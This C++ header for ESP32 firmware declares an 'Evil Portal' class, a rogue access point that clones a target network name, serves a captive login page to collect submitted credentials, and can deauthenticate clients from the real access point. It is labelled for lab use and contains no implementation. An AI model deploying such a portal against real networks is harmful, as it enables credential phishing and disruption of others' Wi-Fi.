#pragma once
// G1 — Evil Portal: AP + DNS + HTTP captive portal with evidence integration.
// Clean-room implementation for NEONDRIVE (controlled-lab use only).
//
// Every portal event (start, client association, credential submit, optional
// deauth kicker, stop) is buffered and flushed to the staged session's
// events.csv; stopping the portal auto-stages a session bundle via
// AnalyzerSync, and credential submits feed the PASS/WARNING/FAIL
// quick-verdict as credential evidence.
#include <Arduino.h>
#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>
#include <FS.h>

class EvilPortal {
public:
    struct Config {
        char     ssid[33];      // portal AP SSID (cloned target)
        char     password[65];  // empty = open AP
        uint8_t  channel;       // AP channel (match target for kicker)
        bool     deauthKicker;  // optional: deauth target-AP clients to the portal
        uint8_t  targetBssid[6];// kicker target (target AP BSSID)
        uint8_t  targetChannel; // kicker channel hop target
        uint16_t durationSec;   // 0 = run until stopped
    };

    EvilPortal();

    // Start the portal. Saves current WiFi state, brings up AP + DNS + HTTP.
    // sd may be nullptr (events then buffer in RAM and are dropped at stop).
    bool start(const Config& cfg, fs::FS* sd);

    // Stop the portal, flush events, auto-stage the session bundle,
    // restore the previous WiFi mode.
    void stop();

    // Call frequently from loop().
    void tick();

    bool     running() const          { return running_; }
    uint32_t clientsSeen() const      { return clientsSeen_; }
    uint32_t credentialSubmits() const { return credSubmits_; }
    const char* lastError() const     { return lastError_; }
    const char* ssid() const          { return cfg_.ssid; }

private:
    // 12 buffered lifecycle events; older ones roll off (they are also
    // mirrored to portal.log on SD, so nothing is truly lost).
    static constexpr int kEventBuf = 12;

    struct BufferedEvent {
        char type[20];
        char severity[8];
        char message[80];
    };

    void bufferEvent(const char* type, const char* severity, const char* message);
    void flushEvents();          // stage session + write buffered events
    void writePortalLog(const char* kind, const char* detail);
    void handleRoot();
    void handleLogin();
    void handleCaptiveDetect();
    void handleNotFound();
    void kickerTick();

    bool        running_ = false;
    Config      cfg_ = {};
    fs::FS*     sd_ = nullptr;
    wifi_mode_t prevMode_ = WIFI_MODE_NULL;
    // Server objects are heap-allocated in start() and freed in stop():
    // WebServer + DNSServer carry ~3.5 KB of socket/DNS buffers, and paying
    // for them in .bss permanently would blow the classic-ESP32 DRAM budget.
    // They only exist while the portal runs (the management UI is suspended
    // meanwhile, so peak DRAM is comparable).
    WebServer*  httpServer_ = nullptr;
    DNSServer*  dnsServer_  = nullptr;
    uint32_t    clientsSeen_ = 0;
    uint32_t    credSubmits_ = 0;
    uint32_t    lastStationCount_ = 0;
    uint32_t    startMs_ = 0;
    uint32_t    lastKickerMs_ = 0;
    char        captureDir_[64] = {0};
    char        lastError_[64] = {0};
    BufferedEvent eventBuf_[kEventBuf] = {};
    uint8_t     eventCount_ = 0;
    bool        sessionStaged_ = false;
};

// Global instance — resolves the `extern EvilPortal evil_portal_obj`
// declared in WiFiScan.h.
extern EvilPortal evil_portal_obj;
